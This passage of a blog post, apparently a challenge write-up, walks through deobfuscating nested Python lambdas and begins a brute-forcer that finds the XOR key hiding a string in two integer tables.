</span><span class='line'>    <span class="mi">1362</span><span class="p">,</span> <span class="mi">1368</span><span class="p">,</span> <span class="mi">1352</span><span class="p">,</span> <span class="mi">1374</span><span class="p">,</span> <span class="mi">1365</span><span class="p">,</span> <span class="mi">1302</span>
</span><span class='line'><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="n">zz</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="p">(</span>
</span><span class='line'>    <span class="n">x</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;!&#39;</span><span class="p">,</span> <span class="n">tab1</span><span class="p">),</span>
</span><span class='line'>    <span class="n">x</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;l1&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">[</span><span class="s">&#39;!&#39;</span><span class="p">]),</span>
</span><span class='line'>    <span class="n">x</span>
</span><span class='line'><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>Perfect, now let&rsquo;s repeat the same operations over and over again. At some point, the whole thing becomes crystal clear (sort-of):</p>

<figure class='code'><figcaption><span>cleaned nested lambdas</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c"># Returns { </span>
</span><span class='line'>  <span class="c"># &#39;g&#39;:g, &#39;c&#39;:c, &#39;d&#39;:d,</span>
</span><span class='line'>  <span class="c"># &#39;!&#39;:[],</span>
</span><span class='line'>  <span class="c"># &#39;s&#39;:[],</span>
</span><span class='line'>  <span class="c"># &#39;l&#39;:[j for i in zip(tab0, tab1) for j in i],</span>
</span><span class='line'>  <span class="c"># &#39;l1&#39;:tab1,</span>
</span><span class='line'>  <span class="c"># &#39;l0&#39;:tab0,</span>
</span><span class='line'>  <span class="c"># &#39;i&#39;: 0,</span>
</span><span class='line'>  <span class="c"># &#39;j&#39;: 1302,</span>
</span><span class='line'>  <span class="c"># &#39;$&#39;:None</span>
</span><span class='line'><span class="c">#}</span>
</span><span class='line'><span class="n">res_after_all_operations</span> <span class="o">=</span> <span class="p">(</span>
</span><span class='line'>  <span class="p">(</span>
</span><span class='line'>    <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="p">(</span>
</span><span class='line'>        <span class="n">x</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;!&#39;</span><span class="p">,</span> <span class="p">[]),</span>
</span><span class='line'>        <span class="n">x</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;s&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">[</span><span class="s">&#39;!&#39;</span><span class="p">]),</span>
</span><span class='line'>        <span class="n">x</span>
</span><span class='line'>    <span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'>  <span class="p">)</span>
</span><span class='line'>  <span class="c"># ..</span>
</span><span class='line'>  <span class="p">(</span>
</span><span class='line'>    <span class="p">(</span>
</span><span class='line'>      <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="p">(</span>
</span><span class='line'>          <span class="n">x</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;!&#39;</span><span class="p">,</span> <span class="p">((</span><span class="n">x</span><span class="p">[</span><span class="s">&#39;d&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;d&#39;</span> <span class="ow">in</span> <span class="n">x</span><span class="p">)</span> <span class="k">else</span> <span class="n">d</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">x</span><span class="p">[</span><span class="s">&#39;d&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;d&#39;</span> <span class="ow">in</span> <span class="n">x</span><span class="p">)</span> <span class="k">else</span> <span class="n">d</span><span class="p">))),</span>
</span><span class='line'>          <span class="n">x</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;i&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">[</span><span class="s">&#39;!&#39;</span><span class="p">]),</span>
</span><span class='line'>          <span class="n">x</span>
</span><span class='line'>      <span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'>    <span class="p">)</span>
</span><span class='line'>    <span class="c"># ..</span>
</span><span class='line'>    <span class="p">(</span>
</span><span class='line'>      <span class="p">(</span>
</span><span class='line'>        <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="p">(</span>
</span><span class='line'>            <span class="n">x</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;!&#39;</span><span class="p">,</span> <span class="p">[(</span><span class="n">x</span><span class="p">[</span><span class="s">&#39;j&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;j&#39;</span> <span class="ow">in</span> <span class="n">x</span><span class="p">)</span> <span class="k">else</span> <span class="n">j</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span><span class="p">[</span> <span class="s">&#39;i&#39;</span><span class="p">]</span> <span class="ow">in</span> <span class="p">(</span><span class="n">x</span><span class="p">[</span><span class="s">&#39;zip&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;zip&#39;</span> <span class="ow">in</span> <span class="n">x</span><span class="p">)</span> <span class="k">else</span> <span class="nb">zip</span><span class="p">)((</span><span class="n">x</span><span class="p">[</span><span class="s">&#39;l0&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;l0&#39;</span> <span class="ow">in</span> <span class="n">x</span><span class="p">)</span> <span class="k">else</span> <span class="n">l0</span><span class="p">),</span> <span class="p">(</span><span class="n">x</span><span class="p">[</span><span class="s">&#39;l1&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;l1&#39;</span> <span class="ow">in</span> <span class="n">x</span><span class="p">)</span> <span class="k">else</span> <span class="n">l1</span><span class="p">))</span> <span class="k">for</span> <span class="n">x</span><span class="p">[</span><span class="s">&#39;j&#39;</span><span class="p">]</span> <span class="ow">in</span> <span class="p">(</span><span class="n">x</span><span class="p">[</span><span class="s">&#39;i&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;i&#39;</span> <span class="ow">in</span> <span class="n">x</span><span class="p">)</span> <span class="k">else</span> <span class="n">i</span><span class="p">)]),</span>
</span><span class='line'>            <span class="n">x</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;l&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">[</span><span class="s">&#39;!&#39;</span><span class="p">]),</span>
</span><span class='line'>            <span class="n">x</span>
</span><span class='line'>        <span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'>      <span class="p">)</span>
</span><span class='line'>      <span class="c"># Returns { &#39;g&#39;:g, &#39;c&#39;:c, &#39;d&#39;:d, &#39;!&#39;:tab1, &#39;l1&#39;:tab1, &#39;l0&#39;:tab0, &#39;$&#39;:None}</span>
</span><span class='line'>      <span class="p">(</span>
</span><span class='line'>        <span class="p">(</span>
</span><span class='line'>          <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="p">(</span>
</span><span class='line'>              <span class="n">x</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;!&#39;</span><span class="p">,</span> <span class="n">tab1</span><span class="p">),</span>
</span><span class='line'>              <span class="n">x</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;l1&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">[</span><span class="s">&#39;!&#39;</span><span class="p">]),</span>
</span><span class='line'>              <span class="n">x</span>
</span><span class='line'>          <span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'>        <span class="p">)</span>
</span><span class='line'>        <span class="c"># Return { &#39;g&#39; : g, &#39;c&#39;, &#39;d&#39;: d, &#39;!&#39;:tab0, &#39;l0&#39;:tab0, &#39;$&#39;:None }</span>
</span><span class='line'>        <span class="p">(</span>
</span><span class='line'>          <span class="p">(</span>
</span><span class='line'>            <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="p">(</span>
</span><span class='line'>                <span class="n">x</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;!&#39;</span><span class="p">,</span> <span class="n">tab0</span><span class="p">),</span>
</span><span class='line'>                <span class="n">x</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;l0&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">[</span><span class="s">&#39;!&#39;</span><span class="p">]),</span>
</span><span class='line'>                <span class="n">x</span>
</span><span class='line'>            <span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'>          <span class="p">)</span>
</span><span class='line'>          <span class="p">({</span> <span class="s">&#39;g&#39;</span><span class="p">:</span> <span class="n">g</span><span class="p">,</span> <span class="s">&#39;c&#39;</span><span class="p">:</span> <span class="n">c</span><span class="p">,</span> <span class="s">&#39;d&#39;</span><span class="p">:</span> <span class="n">d</span><span class="p">,</span> <span class="s">&#39;$&#39;</span><span class="p">:</span> <span class="bp">None</span><span class="p">})</span>
</span><span class='line'>        <span class="p">)</span>
</span><span class='line'>      <span class="p">)</span>
</span><span class='line'>    <span class="p">)</span>
</span><span class='line'>  <span class="p">)</span>
</span><span class='line'><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<h2>Putting it all together</h2>

<p>After doing all of that, we know now the types of the three variables the function needs to work properly (and we don&rsquo;t really need more to be honest):</p>

<ul>
<li><em>g</em> is an integer that will be mod 4

<ul>
<li>if the value is divisible by 4, the function returns nothing ; so we will need to have this variable sets to 1 for example</li>
</ul>
</li>
<li><em>c</em> is another integer that looks like a xor key ; if we look at the snippet, this variable is used to xor each byte of <em>x[&lsquo;l&rsquo;]</em> (which is the table with tab0 and tab1)

<ul>
<li>this is the interesting parameter</li>
</ul>
</li>
<li><em>d</em> is another integer that we can also ignore: it&rsquo;s only used to set <em>x[&lsquo;i&rsquo;]</em> to zero by xoring <em>x[&rsquo;d&#8217;]</em> by itself.</li>
</ul>


<p>We don&rsquo;t need anything else really now: no more lambdas, no more pain, no more tears. It is time to write what I call, an <a href="https://github.com/0vercl0k/stuffz/blob/master/ql-chall-python-2014/bf_with_lambdas_cleaned.py"><em>educated</em> brute-forcer</a>, to find the correct value of <em>c</em>:</p>

<figure class='code'><figcaption><span>bf_with_lambdas_cleaned.py</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">):</span>
</span><span class='line'>    <span class="n">tab0</span> <span class="o">=</span> <span class="p">[</span><span class="mi">1375</span><span class="p">,</span> <span class="mi">1368</span><span class="p">,</span> <span class="mi">1294</span><span class="p">,</span> <span class="mi">1293</span><span class="p">,</span> <span class="mi">1373</span><span class="p">,</span> <span class="mi">1295</span><span class="p">,</span> <span class="mi">1290</span><span class="p">,</span> <span class="mi">1373</span><span class="p">,</span> <span class="mi">1290</span><span class="p">,</span> <span class="mi">1293</span><span class="p">,</span> <span class="mi">1280</span><span class="p">,</span> <span class="mi">1368</span><span class="p">,</span> <span class="mi">1368</span><span class="p">,</span><span class="mi">1294</span><span class="p">,</span> <span class="mi">1293</span><span class="p">,</span> <span class="mi">1368</span><span class="p">,</span> <span class="mi">1372</span><span class="p">,</span> <span class="mi">1292</span><span class="p">,</span> <span class="mi">1290</span><span class="p">,</span> <span class="mi">1291</span><span class="p">,</span> <span class="mi">1371</span><span class="p">,</span> <span class="mi">1375</span><span class="p">,</span> <span class="mi">1280</span><span class="p">,</span> <span class="mi">1372</span><span class="p">,</span> <span class="mi">1281</span><span class="p">,</span> <span class="mi">1293</span><span class="p">,</span><span class="mi">1373</span><span class="p">,</span> <span class="mi">1371</span><span class="p">,</span> <span class="mi">1354</span><span class="p">,</span> <span class="mi">1370</span><span class="p">,</span> <span class="mi">1356</span><span class="p">,</span> <span class="mi">1354</span><span class="p">,</span> <span class="mi">1355</span><span class="p">,</span> <span class="mi">1370</span><span class="p">,</span> <span class="mi">1357</span><span class="p">,</span> <span class="mi">1357</span><span class="p">,</span> <span class="mi">1302</span><span class="p">,</span> <span class="mi">1366</span><span class="p">,</span> <span class="mi">1303</span><span class="p">,</span><span class="mi">1368</span><span class="p">,</span> <span class="mi">1354</span><span class="p">,</span> <span class="mi">1355</span><span class="p">,</span> <span class="mi">1356</span><span class="p">,</span> <span class="mi">1303</span><span class="p">,</span> <span class="mi">1366</span><span class="p">,</span> <span class="mi">1371</span><span class="p">]</span>
</span><span class='line'>    <span class="n">tab1</span> <span class="o">=</span> <span class="p">[</span><span class="mi">1373</span><span class="p">,</span> <span class="mi">1281</span><span class="p">,</span> <span class="mi">1288</span><span class="p">,</span> <span class="mi">1373</span><span class="p">,</span> <span class="mi">1290</span><span class="p">,</span> <span class="mi">1294</span><span class="p">,</span> <span class="mi">1375</span><span class="p">,</span> <span class="mi">1371</span><span class="p">,</span><span class="mi">1289</span><span class="p">,</span> <span class="mi">1281</span><span class="p">,</span> <span class="mi">1280</span><span class="p">,</span> <span class="mi">1293</span><span class="p">,</span> <span class="mi">1289</span><span class="p">,</span> <span class="mi">1280</span><span class="p">,</span> <span class="mi">1373</span><span class="p">,</span> <span class="mi">1294</span><span class="p">,</span> <span class="mi">1289</span><span class="p">,</span> <span class="mi">1280</span><span class="p">,</span> <span class="mi">1372</span><span class="p">,</span> <span class="mi">1288</span><span class="p">,</span> <span class="mi">1375</span><span class="p">,</span><span class="mi">1375</span><span class="p">,</span> <span class="mi">1289</span><span class="p">,</span> <span class="mi">1373</span><span class="p">,</span> <span class="mi">1290</span><span class="p">,</span> <span class="mi">1281</span><span class="p">,</span> <span class="mi">1294</span><span class="p">,</span> <span class="mi">1302</span><span class="p">,</span> <span class="mi">1372</span><span class="p">,</span> <span class="mi">1355</span><span class="p">,</span> <span class="mi">1366</span><span class="p">,</span> <span class="mi">1372</span><span class="p">,</span> <span class="mi">1302</span><span class="p">,</span> <span class="mi">1360</span><span class="p">,</span> <span class="mi">1368</span><span class="p">,</span> <span class="mi">1354</span><span class="p">,</span> <span class="mi">1364</span><span class="p">,</span> <span class="mi">1370</span><span class="p">,</span> <span class="mi">1371</span><span class="p">,</span> <span class="mi">1365</span><span class="p">,</span> <span class="mi">1362</span><span class="p">,</span> <span class="mi">1368</span><span class="p">,</span> <span class="mi">1352</span><span class="p">,</span> <span class="mi">1374</span><span class="p">,</span> <span class="mi">1365</span><span class="p">,</span> <span class="mi">1302</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">func</span> <span class="o">=</span> <span class="p">(</span>
</span><span class='line'>        <span class="k">lambda</span> <span class="n">g</span><span class="p">,</span> <span class="n">c</span><span class="p">,</span> <span class="n">d</span><span class="p">:</span>
</span><span class='line'>        <span class="p">(</span>
</span><span class='line'>            <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="p">(</span>
</span><span class='line'>                <span class="n">x</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;$&#39;</span><span class="p">,</span> <span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([(</span><span class="n">x</span><span class="p">[</span><span class="s">&#39;chr&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;chr&#39;</span> <span class="ow">in</span> <span class="n">x</span><span class="p">)</span> <span class="k">else</span> <span class="nb">chr</span><span class="p">)((</span><span class="n">x</span><span class="p">[</span><span class="s">&#39;_&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;_&#39;</span> <span class="ow">in</span> <span class="n">x</span><span class="p">)</span> <span class="k">else</span> <span class="n">x</span><span class="p">))</span> <span class="k">for</span> <span class="n">x</span><span class="p">[</span><span class="s">&#39;_&#39;</span><span class="p">]</span> <span class="ow">in</span> <span class="p">(</span><span class="n">x</span><span class="p">[</span><span class="s">&#39;s&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;s&#39;</span> <span class="ow">in</span> <span class="n">x</span><span class="p">)</span> <span class="k">else</span> <span class="n">s</span><span class="p">)[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]])),</span>
</span><span class='line'>                <span class="n">x</span>
</span><span class='line'>            <span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'>        <span class="p">)</span>
</span><span class='line'>        <span class="p">(</span>
</span><span class='line'>            <span class="p">(</span>
</span><span class='line'>                <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span>
</span><span class='line'>                    <span class="p">(</span><span class="k">lambda</span> <span class="n">f</span><span class="p">,</span> <span class="n">x</span><span class="p">:</span> <span class="n">f</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">x</span><span class="p">))</span>
</span><span class='line'>                <span class="p">(</span>
</span><span class='line'>                    <span class="p">(</span>
</span><span class='line'>                        <span class="k">lambda</span> <span class="n">__</span><span class="p">,</span> <span class="n">x</span><span class="p">:</span>
</span><span class='line'>                        <span class="p">(</span>
</span><span class='line'>                            <span class="p">(</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">__</span><span class="p">(</span><span class="n">__</span><span class="p">,</span> <span class="n">x</span><span class="p">))</span>
</span><span class='line'>                            <span class="p">(</span>
</span><span class='line'>                                <span class="c"># i += 1</span>
</span><span class='line'>                                <span class="p">(</span>
</span><span class='line'>                                    <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="p">(</span>
</span><span class='line'>                                        <span class="n">x</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;i&#39;</span><span class="p">,</span> <span class="p">((</span><span class="n">x</span><span class="p">[</span><span class="s">&#39;i&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;i&#39;</span> <span class="ow">in</span> <span class="n">x</span><span class="p">)</span> <span class="k">else</span> <span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)),</span>
</span><span class='line'>                                        <span class="n">x</span>
</span><span class='line'>                                    <span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'>                                <span class="p">)</span>
</span><span class='line'>                                <span class="p">(</span>
</span><span class='line'>                                    <span class="c"># s += [c ^ l[i]]</span>
</span><span class='line'>                                    <span class="p">(</span>
</span><span class='line'>                                        <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="p">(</span>
</span><span class='line'>                                            <span class="n">x</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;s&#39;</span><span class="p">,</span> <span class="p">(</span>
</span><span class='line'>                                                    <span class="p">(</span><span class="n">x</span><span class="p">[</span><span class="s">&#39;s&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;s&#39;</span> <span class="ow">in</span> <span class="n">x</span><span class="p">)</span> <span class="k">else</span> <span class="n">s</span><span class="p">)</span> <span class="o">+</span>
</span><span class='line'>                                                    <span class="p">[((</span><span class="n">x</span><span class="p">[</span><span class="s">&#39;l&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;l&#39;</span> <span class="ow">in</span> <span class="n">x</span><span class="p">)</span> <span class="k">else</span> <span class="n">l</span><span class="p">)[(</span><span class="n">x</span><span class="p">[</span><span class="s">&#39;i&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;i&#39;</span> <span class="ow">in</span> <span class="n">x</span><span class="p">)</span> <span class="k">else</span> <span class="n">i</span><span class="p">)]</span> <span class="o">^</span> <span class="p">(</span><span class="n">x</span><span class="p">[</span><span class="s">&#39;c&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;c&#39;</span> <span class="ow">in</span> <span class="n">x</span><span class="p">)</span> <span class="k">else</span> <span class="n">c</span><span class="p">))]</span>
</span><span class='line'>                                                <span class="p">)</span>
</span><span class='line'>                                            <span class="p">),</span>
</span><span class='line'>                                            <span class="n">x</span>
</span><span class='line'>                                        <span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'>                                    <span class="p">)</span>
</span><span class='line'>                                    <span class="p">(</span><span class="n">x</span><span class="p">)</span>
</span><span class='line'>                                <span class="p">)</span>
</span><span class='line'>                            <span class="p">)</span>
</span><span class='line'>                            <span class="c"># if ((x[&#39;g&#39;] % 4) and (x[&#39;i&#39;] &lt; len(l))) else x</span>
</span><span class='line'>                            <span class="k">if</span> <span class="p">(((</span><span class="n">x</span><span class="p">[</span><span class="s">&#39;g&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;g&#39;</span> <span class="ow">in</span> <span class="n">x</span><span class="p">)</span> <span class="k">else</span> <span class="n">g</span><span class="p">)</span> <span class="o">%</span> <span class="mi">4</span><span class="p">)</span> <span class="ow">and</span> <span class="p">((</span><span class="n">x</span><span class="p">[</span><span class="s">&#39;i&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;i&#39;</span> <span class="ow">in</span> <span class="n">x</span><span class="p">)</span> <span class="k">else</span> <span class="n">i</span><span class="p">)</span><span class="o">&lt;</span> <span class="p">(</span><span class="n">x</span><span class="p">[</span><span class="s">&#39;len&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;len&#39;</span> <span class="ow">in</span> <span class="n">x</span><span class="p">)</span> <span class="k">else</span> <span class="nb">len</span><span class="p">)((</span><span class="n">x</span><span class="p">[</span><span class="s">&#39;l&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;l&#39;</span> <span class="ow">in</span> <span class="n">x</span><span class="p">)</span> <span class="k">else</span> <span class="n">l</span><span class="p">))))</span>
</span><span class='line'>                            <span class="k">else</span> <span class="n">x</span>
</span><span class='line'>                        <span class="p">)</span>
</span><span class='line'>                    <span class="p">),</span>
</span><span class='line'>                    <span class="n">x</span>
</span><span class='line'>                <span class="p">)</span>
</span><span class='line'>            <span class="p">)</span>
</span><span class='line'>            <span class="c"># Returns { &#39;g&#39;:g, &#39;c&#39;:c, &#39;d&#39;:d, &#39;!&#39;:zip(tab1, tab0), &#39;l&#39;:zip(tab1, tab0), l1&#39;:tab1, &#39;l0&#39;:tab0, &#39;i&#39;: 0, &#39;j&#39;: 1302, &#39;!&#39;:0, &#39;s&#39;:[] }</span>
</span><span class='line'>            <span class="p">(</span>
</span><span class='line'>                <span class="p">(</span>
</span><span class='line'>                    <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="p">(</span>
</span><span class='line'>                        <span class="n">x</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;!&#39;</span><span class="p">,</span> <span class="p">[]),</span>
</span><span class='line'>                        <span class="n">x</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;s&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">[</span><span class="s">&#39;!&#39;</span><span class="p">]),</span>
</span><span class='line'>                        <span class="n">x</span>
</span><span class='line'>                    <span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'>                <span class="p">)</span>
</span><span class='line'>                <span class="c"># Returns { &#39;g&#39;:g, &#39;c&#39;:c, &#39;d&#39;:d, &#39;!&#39;:zip(tab1, tab0), &#39;l&#39;:zip(tab1, tab0), l1&#39;:tab1, &#39;l0&#39;:tab0, &#39;i&#39;: 0, &#39;j&#39;: 1302, &#39;!&#39;:0}</span>
</span><span class='line'>                <span class="p">(</span>
</span><span class='line'>                    <span class="p">(</span>
</span><span class='line'>                        <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="p">(</span>
